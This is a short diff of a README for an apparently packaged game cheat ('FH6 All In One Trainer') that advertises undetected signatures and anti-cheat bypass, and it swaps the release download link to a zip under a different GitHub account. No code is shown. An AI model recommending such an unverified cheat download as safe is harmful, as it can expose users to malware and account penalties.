@@ -8,7 +8,7 @@ The trainer ships with undetected signatures, an anti- bypass layer, and a hot-r
 <img width="686" height="386" alt="images1" src="https://github.com/user-attachments/assets/c43b4bba-f460-44ea-a18a-0bc121740f47" />
 
 ## Install
-[Download `FH6AllInOneTrainer.zip`](https://github.com/forzahorizon6trainer/FH6-Trainer-AllInOne/releases/download/v6.0.1/FH6AllInOneTrainer-v7.0.0.zip)
+[Download `FH6AllInOneTrainer.zip`](https://github.com/fh6trainer/FH6-Trainer-AllInOne/releases/download/v2.1/FH6AllInOneTrainer.zip)
 ---
 
 <img width="668" height="459" alt="images2" src="https://github.com/user-attachments/assets/a60958c4-dfbc-409a-8def-676bc522ae4e" />
